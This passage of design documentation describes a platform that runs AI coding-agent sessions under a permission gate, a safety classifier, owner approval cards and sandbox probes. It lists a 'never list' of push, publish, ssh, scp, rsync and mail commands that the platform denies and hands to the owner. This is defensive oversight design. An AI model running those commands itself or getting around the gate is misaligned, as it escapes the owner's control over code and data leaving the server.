  it (the session marked idle over its card), and a deferral inside it lost. So background tasks are off
  (`cliengine.NO_BACKGROUND`, required by `check_env`): `run_in_background` is gone from the `Agent` and `Bash`
  schemas, every subagent runs inside the turn, one `result` per run. Several asked for in one message run in
  parallel. A subagent beside a deferred call of the main agent runs to its end; the run then ends deferred, and on
  your grant only that call runs.
- **No background commands either.** The same variable takes `run_in_background` from `Bash`: a build, a test
  suite or an install runs as one foreground call. So the lane gives Bash longer timeouts — 10 minutes by default,
  60 at most when the model asks (`BASH_DEFAULT_TIMEOUT_MS`, `BASH_MAX_TIMEOUT_MS` in `cliengine.BASH_TIMEOUTS`;
  the CLI's own are 2 and 10) — and the lane's instructions say: long builds and tests as one foreground command, no
  servers or watch modes (they never end; the timeout would end them). A run waits for such a call; the owner's
  «Stop» still stops it.

Fork subagents stay off ([What a lane sees](#what-a-lane-sees)). `tests/test_probes.py` pins all of the above but the
real runs.

## Questions

A session asks you as on the Mac: AskUserQuestion, one to four questions, each with two to four options, some
multi-select. A headless CLI offers that tool only when a host can answer it, so every run is
`--permission-prompt-tool stdio` — not `--permission-prompts none`, which takes it away (probed with 2.1.304). The
asks that come with it stay closed: the gate's PermissionRequest hook denies every one, as before; one no hook
decided reaches the lane host as a `control_request` on the CLI's stdout, and the lane host denies it at once
(`cliengine.deny_control`) — the run never waits on it, and nothing is ever granted that way.

The gate defers every AskUserQuestion — never the classifier's, never run unanswered — and you get one message per
question: one head line «❓ <track> · <header> · 1 of 2» (no session number: a reply to it goes to its session), the question and its options verbatim, each with its description, and the options as
buttons. A single choice is answered by its button; a multi-select's buttons tick (☐/☑: each press toggles that
option in the stored picks, the same buttons relabelled, so fast taps all count) and «Done» sends what is ticked;
**a reply to the question's message** is your own answer («Your answer…»), a spoken one too — taken once: the router
sending it again changes nothing. A reply with files is never an answer: it goes in as a message with its files. The message is rewritten with «Answer: …» and no buttons; in the app the same
question card answers by the same rules ([face.md](face.md)), and an answer in either place retires the other. When
every question has its answer, the session resumes: the gate answers the resumed call `allow` with the call's input
plus `answers` (each question's text → the label, the labels joined by «, », or your text), and the model is told
«Your questions have been answered: …».

Like a card: bound to the call's digest; it survives restarts — press an hour later and the answer goes in once; a
new message to the session makes it stale and the model is told so; unanswered for 7 days, it expires and the model
is told it went unanswered. A reply to a question that no longer asks is a message into the session, like any reply.

## Pings

The end of every turn comes to you as a ping (`retinue/pings.py`): a header `<icon> <sphere or track> · <title> ·
<took>`, then the text — ✅ done, ❓ waits on you (a question or an approval card of the session is shown), ⚠️ broke (an error, the subscription's limit, a turn a restart cut, a run its lane refused). `<took>` is the
time since you last acted on the session: your last message, or the start of the run that ended (a run starts on your
message or on your decision on a card; one that waited for room on its lane counts from its start). A long text is
split as before; a reply to any of its messages goes into the session.

**When a session asks you.** The lanes' instructions (`deploy/lanes/instructions/common.md`) tell the model to decide
itself what is reversible, stays on the server and has an obvious best way — and to ask you only when the decision is
yours: it cannot be undone, leaves the server under your name, costs money, is a matter of your taste, or has ways of
about equal worth, and your answer changes what it does. Never to go on, to confirm, or for what the rules already
allow. Then it asks with AskUserQuestion ([Questions](#questions)), never in the text: at most two or three lines of
what is at stake before it; the fork in a dozen words; two or three options different in kind, each an action and
what follows from it in a line; the one it recommends first, marked «(Recommended)», only when it truly recommends
one. You can always answer in your own words. So a decision is a question card — its options described, an answer of
your own always open, alive 7 days and through restarts — and the run stops on it, holding no room on its lane.

After a run in the Base the platform commits by itself what the assistant may write, and the ping gets **«Undo · N in
the Base»** ([base.md](base.md#the-platforms-own-commit)) — gone once undone. What is left — files only the owner
commits — has a button on the session's latest ping: **«To the Base · N»** ([base.md](base.md#the-button)). It comes a
poll after the ping (the message is rewritten with it), moves to the next ping, is relabelled when N changes and goes
when nothing is left.

**Loudness.** A ✅ ping less than 2 minutes (`pings.QUIET_S`) after you last acted on the session, of a run your own
message or decision started, goes out without a sound (`disable_notification`): you are looking. A longer one, a ❓
and a ⚠️ one, and one of a run the platform started by itself — a turn going on after a restart, a resume the gate's
own shutdown left owed (`ping_unattended`) — notify. A summary from before pings
(no `kind` in its note) goes out as it did, «Result · <track> · session <id>» and the text.

**A session you drive from the app is read there.** When your last message into a session was written in the app —
or was a reply you pressed on a ping only the app showed — its ping is marked `in_app` and Telegram does not get it
again. Only a turn that took 5 minutes or more (`pings.AWAY_S`), when you may have left the app, reaches Telegram, as
its header line, «Answered in the app.» and an «Open» button to the session. Write into the session from Telegram and
its turns come there in full again.

## The never list and the courier card

`git push`, `gh pr create`, `gh pr merge`, `gh release create`, `npm publish`, `pnpm publish`, `yarn publish`,
`uv publish`, `twine upload`, `cargo publish`, `docker push`, `kubectl apply`, `ssh`, `scp`, `sftp`, `rsync`,
`sendmail`, `mail`, `mailx` (`NEVER` in
`retinue/approvals.py`). Such a call is refused in the session and comes to you as a courier card: «Courier · <track> ·
session <id>», what the session wants, the directory, the exact command, and «Not running it: you do this yourself —
the whole command is above.» There is no button that runs it: run it yourself, where you hold the credential. In
the app the card has «Done» beside «Copy command» (`POST /api/approvals/{id}/done`, state `done`): you did it, or
will not, and it leaves «Waiting for you» — where it otherwise waits a day, or until you write to its session. On the lane that holds
your repositories (`code:` in platform.yaml), a `git push` or a `gh pr create` says instead «press «Push» under
the session's result», and the session is told the platform pushes by your button: a branch and a pull request, never the
default branch ([code.md](code.md)). Each entry is also a
deny rule of every run, so not even a mistaken grant could run it.

A never mark counts only when the command's text names that action itself. On a command it cannot read through (`$VAR`,
`$(…)`) the CLI runs every marker hook whose pattern names more than the program, whatever the command does — a
delete in the Base that wrote to `$TMPDIR` once came as «publish an npm package (yarn publish)». Such a mark is
dropped and the call goes the usual way; the text is still read for the whole list.

## How the work went

The platform counts its own week, in code and in words that are its own rather than the CLI's (`retinue/signals.py`).
A row is a kind, a time, a session, at most a tool and a short note — never an input, a command or a message:

| Kind | Where it comes from | Its note |
|---|---|---|
| `gate` | every hook the gate answers | `allow` (your grant), `deny` or `defer` with the gate's reason, `rule` / `rule_deny` (an always or deny rule decides), `classifier` (nothing named it), `blocked` with the classifier's `[tag]` only, `asked` (a fallback run's ask) |
| `tool_error` | a tool result the CLI marks as an error | the call's id: the tool is the one the gate saw for it |
| `compaction` | the CLI's `compact_boundary` line | — |
| `run_error` | a turn the platform told you ended in an error («Turn ended with an error») | once a run |
| `owner_stop` | «Stop» in the app | — |

`tool_error` and `compaction` are read by the engine's adapter (`signals.from_line`), the one place that knows the
CLI's stream-json, keyed by the lane's line so a line given again counts once; another engine gets its own adapter
and the kinds stay. What the platform's tables already hold is read there, not copied: your messages, runs, sessions,
and cards with how you decided them. Rows older than 400 days go when the platform starts.

`POST /owner/stats` (the router's token, as every `/owner/*` call) with `{since, until}` answers the tally: sessions
and sub-sessions started, runs, your messages and stops, tool errors by tool, compactions, failed turns, the gate's
calls by how they went and its five most frequent reasons, and cards by how they ended. The weekly review puts it
in words at its end, «How the week went» ([proactive.md](proactive.md#how-the-week-went)).

## Probes

The CLI behaviour the platform rests on — defer, resume, marker hooks, settings that do not load — is pinned by
probes that run the pinned binary against a local fake Messages API (no credential, no cost):

```bash
bash deploy/lanes/fetch-cli.sh ~/.cache/retinue-cli            # the pinned CLI, integrity checked
RETINUE_LANE_CLI=~/.cache/retinue-cli/claude uv run --locked --with pytest pytest -q -m probe tests
```

They run in auto, as the lanes do, with the stdio prompt tool: AskUserQuestion is offered only with it, deferred and
answered on resume with `updatedInput.answers` (an `allow` without them asks again, and that ask is denied), and an ask
no hook decides is denied by a real lane host, the run ending instead of waiting. The fake API gives the classifier no verdict it can read, so the classifier
blocks every call it is asked about (a file command inside the working directory never reaches it): that pins the
whole path of a block — `PermissionDenied`, the retry, the repeat as a card with the reason, the grant after both
processes restarted, one run past the classifier. Without `RETINUE_LANE_CLI` they are skipped. The login probe also
needs `CLAUDE_CODE_OAUTH_TOKEN`. Run them before
bumping the version in `deploy/lanes/cli.lock` (together with `cliengine.CLI_VERSION` and `tests/test_pins.py`).

Two of them answer what the room's sessions rely on. [Subagents](#subagents): they run, in the foreground, their
calls reach the gate marked by `agent_id`, and a deferral inside one is lost. And nested rules: under
`--setting-sources ""` the CLI never loads the `CLAUDE.md` of a subfolder when the model reads a file there (with
`project` it does, and the lone `AGENTS.md` of a folder without one too) — a session whose cwd is the Base's root and
that works in `/work/code/<repo>` gets that repository's rules only by reading them, as its instructions tell it
([instructions.md](instructions.md#the-repositorys-rules)).

The **container probe** builds the lane image and runs it as compose does, under the lanes' AppArmor and seccomp
profiles (load the AppArmor one first: `setup.sh` does), with the real login: the managed settings are readable; the lane host reports the pinned CLI, and `loggedIn` once a run has brought it the token (the platform hands it over
with each run; before the first, `/ping` says `loggedIn: false`); a Bash run sees no token (`sk-ant-`) in its
environment or any `/proc/*/environ`, nor the hook token or the token's descriptor (the scrub off, the managed
settings' `sandbox.credentials`); a write into `/lane/config` fails; a Bash call's `allowed_domains` reaches
nothing; the init line says `permissionMode: auto`; the room offers `WebSearch` and `WebFetch`. It needs Docker and
`CLAUDE_CODE_OAUTH_TOKEN`, and spends a few model calls:

```bash
CLAUDE_CODE_OAUTH_TOKEN=… uv run --locked --with pytest pytest -q -m probe tests/test_lane_container.py
```

If bubblewrap cannot run in a lane, sessions do not start. The probe says why: the AppArmor profile not loaded
(`apparmor_parser -r /etc/apparmor.d/retinue-lane`), or a kernel or Docker that refuses what the profiles allow.

## Operator checks

1. The container probe above, on the server.
2. A code session on a real repository runs `git status` and an edit with no card (auto); asked to repoint
   `origin` to another URL, it comes to you as a card «Stopped by the classifier: …»; `docker compose restart`; an
   hour later press «Allow»: the call ran once (the approval's row in the platform's `approvals` table is
   `executed`; one execution in the transcript). No session got «Auto mode is off…».
3. A code session asked to push gets a courier card, no approval card, and nothing is pushed.
4. `docker kill $(docker compose -p retinue ps -q platform)` in the middle of a turn (a crash, not a graceful stop:
   no hook answers `defer`, no run is stopped): the session's tool calls fail as blocked; `docker compose up -d
   platform`: the transcript is complete.
5. `docker compose restart platform` in the middle of a turn: once it is back, the session goes on by itself, and
   you get «Turn cut off: the platform restarted…» — once, however many lines the lane gives again.
6. `docker compose stop lane-private` in the middle of a turn returns within seconds, not after the 30 s grace
   (`docker compose logs lane-private`: «stopping 1 runs»); after `docker compose up -d lane-private` the run's lines in the
   platform's `raw` table end with `stopped` (`by: shutdown`) and `exited`, no `restarted`, and the session went on
   by itself, with one «Turn cut off…» summary.
7. In a session in the room, Bash runs `git ls-remote https://github.com/git/git HEAD`, `pip index versions six` and
   `curl -sI https://registry.npmjs.org/left-pad`: all three answer, through the sandbox and the room's proxy (its
   log shows `TCP_TUNNEL` to github.com, pypi.org, registry.npmjs.org); `curl -sI https://example.com` fails, and a
   `WebFetch` of it answers.
8. A change under `retinue/` mid-turn, then `docker compose up -d --build` (it recreates the lanes, then the
   platform): the session goes on by itself once both are up, with one «Turn cut off…» summary and one resumed run.
9. `/new notes Ask me with options (AskUserQuestion) where to go and what to take — several options in the second
   question`: one message per question with buttons; answer the first by a button, `docker compose restart platform`,
   tick two options of the second and press «Done»: both messages read «Answer: …», the session goes on and its
   answer uses both (the question's row in `approvals` is `executed`). Another such question, answered by a reply to
   its message, reads «Your answer: …». No session's run hangs on an ask: `docker compose logs lane-private` is quiet,
   and a `control_request` in the platform's `raw` table, if any, is followed by the run's `result`.
10. Voice ([face.md](face.md#voice), check 10): dictation works, and
   `docker compose exec lane-private env | grep -c ELEVENLABS` is `0` — the room never has the key.
